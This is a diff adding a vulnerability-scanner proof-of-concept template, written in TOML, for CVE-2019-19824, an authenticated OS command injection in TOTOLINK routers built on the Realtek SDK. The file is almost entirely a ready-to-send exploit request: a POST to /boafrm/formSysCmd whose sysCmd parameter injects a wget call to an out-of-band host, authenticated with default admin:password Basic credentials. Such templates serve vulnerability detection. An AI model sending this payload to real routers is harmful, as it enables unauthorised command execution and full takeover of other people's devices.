@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "TOTOLINK基于Realtek SDK的路由器存在操作系统命令注入漏洞。攻击者需先通过身份认证，随后向boafrm/formSysCmd URI的sysCmd参数发送特制POST请求即可注入并执行任意OS命令，从而获取设备的完全控制权。该漏洞无需依赖Web界面(syscmd.htm)即可利用，影响多款型号的特定固件版本。"
+id = "POC-AVE-2019-0148"
+name = "TOTOLINK Realtek SD Routers - Remote Command Injection PoC"
+severity = "high"
+tags = ["ave-2019-0148"]
+vuln_id = [
+    "CVE-2019-19824",
+    "AVE-2019-0148",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/boafrm/formSysCmd"
+protocol = "http"
+
+[poc.requests.body]
+content = "submit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd=wget+http://{{interactsh-url}}"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic YWRtaW46cGFzc3dvcmQ="
+Content-Type = "application/x-www-form-urlencoded"
+Host = "{{Hostname}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["http"]
